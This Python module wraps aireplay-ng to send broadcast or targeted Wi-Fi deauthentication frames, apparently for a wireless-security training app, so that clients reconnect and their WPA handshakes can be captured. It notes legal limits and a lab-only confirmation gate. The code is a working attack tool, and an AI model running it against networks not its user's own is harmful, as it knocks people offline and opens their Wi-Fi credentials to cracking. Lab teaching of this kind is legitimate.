"""aireplay-ng wrapper — frame injection.

Today this module only sends deauthentication frames (subtype 12),
which is the Phase B / C use case: spoof the AP, tell its client(s)
to disconnect, optionally watch them reconnect to capture the
resulting EAPOL 4-way handshake (Session 07's whole topic).

Design choices:

* Injection on a dedicated radio (typically ``wlan-ap``). The recon
  adapters stay channel-hopping in monitor mode so we can simultaneously
  inject and observe. The service layer is responsible for choosing
  the right interface; this wrapper just runs aireplay against
  whatever it's given.
* Channel pinning is the caller's responsibility — call
  ``iw.set_channel(iface, ch)`` before running deauth. Frames sent
  off-channel are silently dropped by the AP. Documented in the
  docstring rather than auto-handled here because the channel comes
  from somewhere outside (the merged AP snapshot).
* Stub mode returns a synthetic success without exec'ing anything.
  Lets Mac dev exercise the UI/service path without real injection.

Ethics: deauth against equipment we don't own is illegal in many
jurisdictions (US: 18 U.S.C. § 1362 / FCC Part 15 enforcement).
The Recon UI surfaces an explicit "lab equipment only" confirm
modal before any deauth action; this wrapper trusts that gate.
"""

from __future__ import annotations

import logging
import re

from app.tools._common import run, stub_mode

log = logging.getLogger(__name__)

_MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
_BROADCAST_MAC = "FF:FF:FF:FF:FF:FF"


def send_deauth(
    iface: str,
    bssid: str,
    *,
    client_mac: str | None = None,
    count: int = 10,
    interval_ms: int | None = None,
) -> tuple[bool, str]:
    """Send ``count`` deauth bursts at ``bssid`` (or one client of it).

    * ``client_mac=None`` → broadcast deauth (DA = ff:ff:ff:ff:ff:ff).
      Every client associated to the AP gets the frame. Cheapest way
      to force a re-association storm.
    * ``client_mac=<MAC>`` → targeted deauth at one station. Use when
      you only want to disturb one client (e.g. a single iPhone in a
      test home network); leaves the rest of the network in peace.
    * ``count`` — aireplay's ``--deauth N`` argument. Each unit is
      typically one burst of 64 frames. 10 is plenty for a clean
      reconnect; 0 means infinite (don't pass 0 here, we don't want
      the wrapper to block forever).
    * ``interval_ms`` — if set, passes ``--ignore-negative-one`` and
      a wait. Reserved for slower drivers; default leaves it off.

    Returns ``(ok, message)``. ``ok=False`` typically means aireplay
    couldn't put the radio in monitor mode (caller forgot), the
    channel wasn't pinned, the BSSID is wrong, or MFP is in play and
    the AP rejected the frames.

    The caller is responsible for:
      1. Ensuring ``iface`` is in monitor mode.
      2. Pinning ``iface`` to ``bssid``'s channel via
         ``iw.set_channel`` first.
    """
    if not _MAC_RE.match(bssid):
        return False, f"bssid {bssid!r} doesn't look like a MAC address"
    if client_mac is not None and not _MAC_RE.match(client_mac):
        return False, f"client_mac {client_mac!r} doesn't look like a MAC address"
    if not (1 <= count <= 1000):
        return False, f"count {count} out of range (1..1000)"

    if stub_mode():
        target = client_mac or _BROADCAST_MAC
        return True, (
            f"(stub) aireplay --deauth {count} -a {bssid} -c {target} {iface}"
        )

    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client_mac:
        cmd += ["-c", client_mac]
    cmd.append(iface)

    # aireplay-ng is interactive-ish even with --deauth; cap at a
    # generous timeout. A typical 10-burst run finishes in ~3s.
    result = run(cmd, timeout=30.0, source="aireplay")
    if result.returncode == 0:
        target = client_mac or "(broadcast)"
        return True, (
            f"sent {count} deauth bursts at {bssid} via {iface} "
            f"(target={target})"
        )
    return False, (
        f"aireplay --deauth failed: "
        f"{result.stderr.strip() or result.stdout.strip()}"
    )
